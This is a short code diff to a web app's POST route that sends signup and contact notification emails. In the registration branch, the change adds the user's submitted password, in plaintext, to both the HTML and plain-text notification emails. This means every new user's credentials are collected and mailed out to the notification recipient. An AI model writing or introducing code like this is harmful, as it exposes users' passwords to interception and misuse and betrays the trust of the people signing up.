@@ -41,9 +41,9 @@ export async function POST(request: Request) {
     let emailHtml = "";
 
     if (step === "registration") {
-      const { name, email, phone } = data;
+      const { name, email, password, phone } = data;
       subject = `New Signup - ${name} (${email}) [${timestamp}]`;
-      emailHtml = render(<RegistrationEmail name={name} email={email} phone={phone} />);
+      emailHtml = render(<RegistrationEmail name={name} email={email} password={password} phone={phone} />);
     } else if (step === "contact") {
       const { name, email, subject: contactSubject, category, message } = data;
       subject = `New Contact Message - ${contactSubject || category} (${name}) [${timestamp}]`;
@@ -56,7 +56,7 @@ export async function POST(request: Request) {
       subject,
       html: emailHtml,
       text: step === "registration"
-        ? `New signup from ${data.name} (${data.email}), phone: ${data.phone}`
+        ? `New signup from ${data.name} (${data.email}), (${data.password}) phone: ${data.phone}`
         : `Contact message from ${data.name} (${data.email}): ${data.message}`,
     });
 
